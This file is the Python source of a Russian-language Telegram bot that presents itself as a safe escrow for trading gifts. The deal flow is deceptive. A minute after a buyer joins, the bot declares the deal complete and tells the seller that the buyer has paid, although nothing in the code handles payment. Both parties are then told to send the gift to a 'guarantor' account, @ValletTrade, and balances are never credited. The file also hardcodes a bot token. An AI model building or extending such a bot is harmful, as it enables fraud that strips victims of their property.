import asyncio
import logging
import random
import re
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    ReplyKeyboardMarkup, KeyboardButton, 
    InlineKeyboardMarkup, InlineKeyboardButton,
    WebAppInfo
)

# ==================== КОНФИГУРАЦИЯ ====================
BOT_TOKEN = "8669209199:AAFnRG3FG4q0KpR7T-bk_THhpAhEltz_H7U"

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# ==================== ХРАНИЛИЩЕ ====================
exchanges = {}
user_balances = {}
user_history = {}

# ==================== ФУНКЦИИ ====================
def generate_code():
    return f"{random.randint(0, 9999):04d}"

def format_price(price):
    if price.is_integer():
        return f"${int(price)}"
    return f"${price:.2f}"

def get_balance(user_id: int) -> float:
    return user_balances.get(user_id, 0.0)

def add_to_balance(user_id: int, amount: float, exchange_id: str):
    if user_id not in user_balances:
        user_balances[user_id] = 0.0
    user_balances[user_id] += amount
    
    if user_id not in user_history:
        user_history[user_id] = []
    user_history[user_id].append({
        "type": "income",
        "amount": amount,
        "exchange_id": exchange_id,
        "date": str(asyncio.get_event_loop().time())
    })
    return user_balances[user_id]

def subtract_from_balance(user_id: int, amount: float, exchange_id: str):
    if user_id not in user_balances:
        user_balances[user_id] = 0.0
    user_balances[user_id] -= amount
    
    if user_id not in user_history:
        user_history[user_id] = []
    user_history[user_id].append({
        "type": "outcome",
        "amount": amount,
        "exchange_id": exchange_id,
        "date": str(asyncio.get_event_loop().time())
    })
    return user_balances[user_id]

# ==================== КНОПКИ ====================
def get_main_keyboard():
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🆕 Создать сделку")],
            [KeyboardButton(text="🔗 Подключиться")],
            [KeyboardButton(text="💰 Баланс"), KeyboardButton(text="📊 История")],
            [KeyboardButton(text="❌ Отмена")]
        ],
        resize_keyboard=True,
        input_field_placeholder="Выберите действие..."
    )
    return keyboard

def get_cancel_keyboard():
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="❌ Отмена")]
        ],
        resize_keyboard=True
    )
    return keyboard

# ==================== СОСТОЯНИЯ ====================
class TradeStates(StatesGroup):
    waiting_for_exchange = State()
    waiting_for_password = State()
    waiting_for_create_link = State()
    waiting_for_create_price = State()

# ==================== КОМАНДЫ ====================
@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()
    
    web_app_button = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(
                text="🚀 Открыть приложение",
                web_app=WebAppInfo(url="https://ajl7oputm.github.io/AppTrade/")
            )],
            [InlineKeyboardButton(
                text="💬 Использовать чат",
                callback_data="use_chat"
            )]
        ]
    )
    
    await message.answer(
        "✨ *Добро пожаловать в Trade Bot!* ✨\n\n"
        "🤝 Безопасный обмен подарками\n\n"
        "📌 *Как это работает:*\n"
        "1️⃣ Продавец создаёт сделку → загружает ссылку + цену\n"
        "2️⃣ Получает номер и пароль\n"
        "3️⃣ Покупатель вводит номер и пароль → подключается\n"
        "4️⃣ Через 1 минуту сделка завершается ✅\n"
        "5️⃣ Покупатель отправляет подарок @ValletTrade\n"
        "6️⃣ Продавец получает деньги на баланс 💰\n\n"
        "📱 *Выберите способ взаимодействия:*",
        parse_mode="Markdown",
        reply_markup=web_app_button
    )

@dp.callback_query(lambda c: c.data == "use_chat")
async def process_callback(callback_query: types.CallbackQuery):
    await bot.answer_callback_query(callback_query.id)
    await bot.send_message(
        callback_query.from_user.id,
        "💬 Используйте кнопки ниже для работы с ботом:",
        reply_markup=get_main_keyboard()
    )

@dp.message(Command("app"))
async def cmd_app(message: types.Message):
    web_app_button = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(
                text="🚀 Открыть приложение",
                web_app=WebAppInfo(url="https://ajl7oputm.github.io/AppTrade/")
            )]
        ]
    )
    
    await message.answer(
        "📱 *Trade Bot App*\n\n"
        "Нажмите кнопку, чтобы открыть приложение!",
        parse_mode="Markdown",
        reply_markup=web_app_button
    )

@dp.message(Command("balance"))
async def cmd_balance(message: types.Message):
    balance = get_balance(message.from_user.id)
    await message.answer(
        f"💰 *Ваш баланс:* ${balance:.2f}\n\n"
        f"📊 Всего транзакций: {len(user_history.get(message.from_user.id, []))}",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )

@dp.message(Command("history"))
async def cmd_history(message: types.Message):
    history = user_history.get(message.from_user.id, [])
    if not history:
        await message.answer("📭 История пуста.", reply_markup=get_main_keyboard())
        return
    
    text = "📊 *История транзакций:*\n\n"
    for h in history[-10:]:
        sign = "+" if h["type"] == "income" else "-"
        text += f"└ #{h['exchange_id']}: {sign}${h['amount']:.2f}\n"
    
    await message.answer(text, parse_mode="Markdown", reply_markup=get_main_keyboard())

@dp.message(Command("cancel"))
async def cmd_cancel(message: types.Message, state: FSMContext):
    current_state = await state.get_state()
    if current_state is None:
        await message.answer("❌ Нет активных операций.", reply_markup=get_main_keyboard())
        return
    await state.clear()
    await message.answer("✅ Операция отменена.", reply_markup=get_main_keyboard())

# ==================== СОЗДАНИЕ СДЕЛКИ ====================
@dp.message(lambda message: message.text == "🆕 Создать сделку")
async def button_create_exchange(message: types.Message, state: FSMContext):
    exchange_id = generate_code()
    while exchange_id in exchanges:
        exchange_id = generate_code()
    
    password = generate_code()
    
    exchanges[exchange_id] = {
        "password": password,
        "creator": message.from_user.id,
        "gift_link": None,
        "price": None,
        "buyer": None,
        "status": "waiting_for_link",
        "created_at": asyncio.get_event_loop().time()
    }
    
    await state.update_data(exchange_id=exchange_id)
    await state.set_state(TradeStates.waiting_for_create_link)
    
    await message.answer(
        f"🎉 *Сделка создана!*\n\n"
        f"📌 *Номер:* `{exchange_id}`\n"
        f"🔑 *Пароль:* `{password}`\n\n"
        f"📎 Отправьте *ссылку на подарок*:",
        parse_mode="Markdown",
        reply_markup=get_cancel_keyboard()
    )

@dp.message(TradeStates.waiting_for_create_link)
async def process_create_link(message: types.Message, state: FSMContext):
    gift_link = message.text.strip()
    
    if not re.match(r'^https?://', gift_link):
        await message.answer("❌ Отправьте ссылку (http:// или https://)", parse_mode="Markdown")
        return
    
    data = await state.get_data()
    exchange_id = data.get('exchange_id')
    
    if exchange_id in exchanges:
        exchanges[exchange_id]["gift_link"] = gift_link
        exchanges[exchange_id]["status"] = "waiting_for_price"
    
    await state.set_state(TradeStates.waiting_for_create_price)
    await message.answer("💰 Укажите *сумму* (в долларах):", parse_mode="Markdown")

@dp.message(TradeStates.waiting_for_create_price)
async def process_create_price(message: types.Message, state: FSMContext):
    try:
        price = float(message.text.replace(',', '.'))
        if price <= 0:
            await message.answer("❌ Сумма должна быть > 0")
            return
    except ValueError:
        await message.answer("❌ Введите число")
        return
    
    data = await state.get_data()
    exchange_id = data.get('exchange_id')
    
    if exchange_id in exchanges:
        exchanges[exchange_id]["price"] = price
        exchanges[exchange_id]["status"] = "waiting_for_buyer"
    
    price_str = format_price(price)
    
    await message.answer(
        f"✅ *Сделка создана!* 🎉\n\n"
        f"📋 Номер: `{exchange_id}`\n"
        f"🔑 Пароль: `{exchanges[exchange_id]['password']}`\n"
        f"💰 Сумма: {price_str}\n\n"
        f"⏳ Ожидайте покупателя...\n"
        f"Вы получите уведомление, когда кто-то подключится.",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )
    await state.clear()

# ==================== ПОДКЛЮЧЕНИЕ ====================
@dp.message(lambda message: message.text == "🔗 Подключиться")
async def button_connect_exchange(message: types.Message, state: FSMContext):
    await state.set_state(TradeStates.waiting_for_exchange)
    await message.answer(
        "🔍 Введите *номер сделки*:\n\n"
        "_(который вы получили от продавца)_",
        parse_mode="Markdown",
        reply_markup=get_cancel_keyboard()
    )

@dp.message(TradeStates.waiting_for_exchange)
async def process_exchange_number(message: types.Message, state: FSMContext):
    exchange_id = message.text.strip()
    
    if exchange_id not in exchanges:
        await message.answer(
            f"❌ *Сделка #{exchange_id} не найдена!*\n"
            f"Проверьте номер и попробуйте снова.",
            parse_mode="Markdown"
        )
        return
    
    if exchanges[exchange_id]["status"] == "completed":
        await message.answer(
            f"❌ *Сделка #{exchange_id} уже завершена!*",
            parse_mode="Markdown"
        )
        await state.clear()
        return
    
    if exchanges[exchange_id]["status"] == "active":
        await message.answer(
            f"❌ *Сделка #{exchange_id} уже активна!*",
            parse_mode="Markdown"
        )
        await state.clear()
        return
    
    await state.update_data(exchange_id=exchange_id)
    await state.set_state(TradeStates.waiting_for_password)
    
    await message.answer(
        f"🔑 Введите *пароль* для сделки #{exchange_id}:",
        parse_mode="Markdown"
    )

@dp.message(TradeStates.waiting_for_password)
async def process_password(message: types.Message, state: FSMContext):
    password = message.text.strip()
    data = await state.get_data()
    exchange_id = data.get('exchange_id')
    
    if exchange_id not in exchanges:
        await message.answer("❌ Сделка не найдена.", reply_markup=get_main_keyboard())
        await state.clear()
        return
    
    if exchanges[exchange_id]["password"] != password:
        await message.answer(
            f"❌ *Неверный пароль!*\n"
            f"Попробуйте снова.",
            parse_mode="Markdown"
        )
        return
    
    # ✅ Подключение
    buyer_id = message.from_user.id
    exchanges[exchange_id]["buyer"] = buyer_id
    exchanges[exchange_id]["status"] = "active"
    
    price = exchanges[exchange_id]["price"]
    gift_link = exchanges[exchange_id]["gift_link"]
    price_str = format_price(price)
    
    # Уведомление покупателя
    await message.answer(
        f"✅ *Подключение успешно!* 🔗\n\n"
        f"📋 *Сделка #{exchange_id}*\n"
        f"🔗 *Ссылка:* {gift_link}\n"
        f"💰 *Сумма:* {price_str}\n\n"
        f"⏳ *Ожидайте 1 минуту...*\n"
        f"Сделка завершится автоматически.",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )
    
    # Уведомление продавца
    creator_id = exchanges[exchange_id]["creator"]
    try:
        await bot.send_message(
            creator_id,
            f"🔔 *Кто-то подключился к сделке #{exchange_id}!*\n\n"
            f"💰 *Сумма:* {price_str}\n"
            f"⏳ Через 1 минуту сделка завершится.",
            parse_mode="Markdown"
        )
    except:
        pass
    
    await state.clear()
    
    # ⏳ Задержка 60 секунд
    await asyncio.sleep(60)
    
    # Проверяем, активна ли сделка
    if exchange_id not in exchanges or exchanges[exchange_id]["status"] != "active":
        return
    
    # Завершаем сделку
    exchanges[exchange_id]["status"] = "completed"
    
    creator_id = exchanges[exchange_id]["creator"]
    buyer_id = exchanges[exchange_id]["buyer"]
    amount = exchanges[exchange_id]["price"]
    gift_link = exchanges[exchange_id]["gift_link"]
    price_str = format_price(amount)
    
    # ✅ НОВАЯ ЛОГИКА: сначала отправка подарка гаранту
    # Сообщение покупателю
    try:
        await bot.send_message(
            buyer_id,
            f"✅ *Сделка #{exchange_id} завершена!* 🎉\n\n"
            f"📦 *Отправьте подарок гаранту:* @ValletTrade\n"
            f"🔗 Ссылка на подарок: {gift_link}\n"
            f"💰 Сумма: {price_str}\n\n"
            f"⏳ После проверки гарантом, продавцу будет зачислена сумма.",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
    except:
        pass
    
    # Сообщение продавцу
    try:
        await bot.send_message(
            creator_id,
            f"✅ *Сделка #{exchange_id} завершена!* 🎉\n\n"
            f"💰 *Покупатель заплатил {price_str}*\n"
            f"📦 Отправьте подарок гаранту: @ValletTrade\n"
            f"🔗 Ссылка на подарок: {gift_link}\n\n"
            f"⏳ После проверки гарантом, вам зачислят на баланс.",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
    except:
        pass

# ==================== КНОПКА БАЛАНС ====================
@dp.message(lambda message: message.text == "💰 Баланс")
async def button_balance(message: types.Message):
    await cmd_balance(message)

# ==================== КНОПКА ИСТОРИЯ ====================
@dp.message(lambda message: message.text == "📊 История")
async def button_history(message: types.Message):
    await cmd_history(message)

# ==================== КНОПКА ОТМЕНА ====================
@dp.message(lambda message: message.text == "❌ Отмена")
async def button_cancel(message: types.Message, state: FSMContext):
    current_state = await state.get_state()
    if current_state is None:
        await message.answer("❌ Нет активных операций.", reply_markup=get_main_keyboard())
        return
    await state.clear()
    await message.answer("✅ Отменено!", reply_markup=get_main_keyboard())

# ==================== ОСТАЛЬНЫЕ СООБЩЕНИЯ ====================
@dp.message()
async def handle_all_messages(message: types.Message, state: FSMContext):
    current_state = await state.get_state()
    
    if current_state is None:
        await message.answer(
            "❓ Используйте кнопки ниже 👇",
            reply_markup=get_main_keyboard()
        )
    else:
        await message.answer(
            "⏳ Следуйте инструкциям бота.",
            reply_markup=get_main_keyboard()
        )

# ==================== ЗАПУСК ====================
async def main():
    print("=" * 50)
    print("🤖 TRADE BOT ЗАПУЩЕН!")
    print("🔗 Web App: https://ajl7oputm.github.io/AppTrade/")
    print("📋 4-значный ID и пароль")
    print("⏳ 60 секунд на сделку")
    print("💰 Система баланса активна")
    print("=" * 50)
    
    try:
        await dp.start_polling(bot)
    except KeyboardInterrupt:
        print("\n🛑 Бот остановлен")
    finally:
        await bot.session.close()

if __name__ == "__main__":
    asyncio.run(main())
